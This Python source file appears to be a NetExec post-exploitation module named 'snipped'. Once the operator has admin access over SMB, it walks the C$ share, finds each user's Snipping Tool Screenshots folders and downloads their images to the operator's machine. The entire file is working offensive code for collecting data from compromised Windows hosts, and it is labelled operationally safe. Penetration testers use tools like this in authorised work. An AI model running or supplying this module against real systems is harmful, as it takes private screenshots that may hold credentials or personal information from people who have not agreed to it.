import ntpath
import os
from os.path import join, getsize, exists
from nxc.paths import NXC_PATH


class NXCModule:

    name = "snipped"
    description = "Downloads screenshots taken by the (new) Snipping Tool."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.context = None
        self.module_options = None
        self.excluded_files = ["desktop.ini"]

    def options(self, context, module_options):
        """USERS: Download only specified user(s); format: -o USERS=user1,user2,user3"""
        self.context = context
        self.users = [user.lower() for user in module_options["USERS"].split(",")] if "USERS" in module_options else None



    def on_admin_login(self, context, connection):
        self.context = context
        self.connection = connection
        self.share = "C$"

        output_base_dir = join(NXC_PATH, "modules", "snipped", "screenshots")
        os.makedirs(output_base_dir, exist_ok=True)

        context.log.info("Getting all user folders")
        try:
            user_folders = connection.conn.listPath(self.share, "\\Users\\*")
        except Exception as e:
            context.log.fail(f"Failed to list user folders: {e}")
            return

        context.log.info(f"User folders: {[folder.get_longname() for folder in user_folders]}")
        if not user_folders:
            context.log.fail("No User folders found!")
            return
        else:
            context.log.info("Attempting to download screenshots if they exist.")

        total_files_downloaded = 0
        host_output_path = None

        for user_folder in user_folders:
            folder_name = user_folder.get_longname()
            if folder_name.lower() not in [".", "..", "all users", "default", "default user", "public"]:
                normalized_name = folder_name.lower()
                if self.users and normalized_name not in self.users:
                    continue

                context.log.info(f"Searching for Screenshots folder in {folder_name}'s home directory")
                screenshots_folders = self.find_screenshots_folders(folder_name)
                if not screenshots_folders:
                    context.log.debug(f"No Screenshots folder found for user {folder_name}. Skipping.")
                    continue

                for screenshot_path in screenshots_folders:
                    try:
                        screenshot_files = connection.conn.listPath(self.share, screenshot_path + "\\*")
                    except Exception as e:
                        context.log.debug(f"Screenshot folder {screenshot_path} not found for user {folder_name}: {e}")
                        continue

                    if not screenshot_files:
                        context.log.debug(f"No screenshots found in {screenshot_path} for user {folder_name}")
                        continue

                    user_output_dir = join(output_base_dir, connection.host)
                    os.makedirs(user_output_dir, exist_ok=True)
                    host_output_path = user_output_dir

                    for file in screenshot_files:
                        if not file.is_directory():
                            remote_file_name = file.get_longname()

                            if remote_file_name.lower() in self.excluded_files:
                                context.log.debug(f"Excluding file {remote_file_name}.")
                                continue

                            remote_file_path = ntpath.join(screenshot_path, remote_file_name)
                            sanitized_path = screenshot_path.replace("\\", "_").replace("/", "_")
                            local_file_name = f"{folder_name}_{sanitized_path}_{remote_file_name}"
                            local_file_path = join(user_output_dir, local_file_name)

                            try:
                                with open(local_file_path, "wb") as local_file:
                                    context.log.debug(f"Downloading {remote_file_path} to {local_file_path}")
                                    connection.conn.getFile(self.share, remote_file_path, local_file.write)

                                if not exists(local_file_path):
                                    context.log.fail(f"Downloaded file '{local_file_path}' does not exist.")
                                    continue

                                file_size = getsize(local_file_path)
                                if file_size == 0:
                                    context.log.fail(f"Downloaded file '{local_file_path}' is 0 bytes. Skipping.")
                                    os.remove(local_file_path)
                                else:
                                    total_files_downloaded += 1
                            except Exception as e:
                                context.log.debug(f"Failed to download '{remote_file_path}' for user {folder_name}: {e}")

        if total_files_downloaded > 0 and host_output_path:
            context.log.success(f"{total_files_downloaded} file(s) downloaded from host {connection.host} to {host_output_path}.")
                            

    def find_screenshots_folders(self, user_folder_name):
        """
        Dynamically searches for all Screenshots folders in the user's home directory.
        Returns a list of paths.
        """
        base_path = ntpath.normpath(join(r"Users", user_folder_name))
        screenshots_folders = []
        try:
            subfolders = self.connection.conn.listPath(self.share, base_path + "\\*")
            for subfolder in subfolders:
                if subfolder.is_directory() and subfolder.get_longname() not in [".", ".."]:
                    potential_path = ntpath.join(base_path, subfolder.get_longname(), "Screenshots")
                    try:
                        if self.connection.conn.listPath(self.share, potential_path + "\\*"):
                            screenshots_folders.append(potential_path)
                    except Exception:
                        continue
        except Exception as e:
            self.context.log.debug(f"Failed to list subfolders for {base_path}: {e}")
        return screenshots_folders
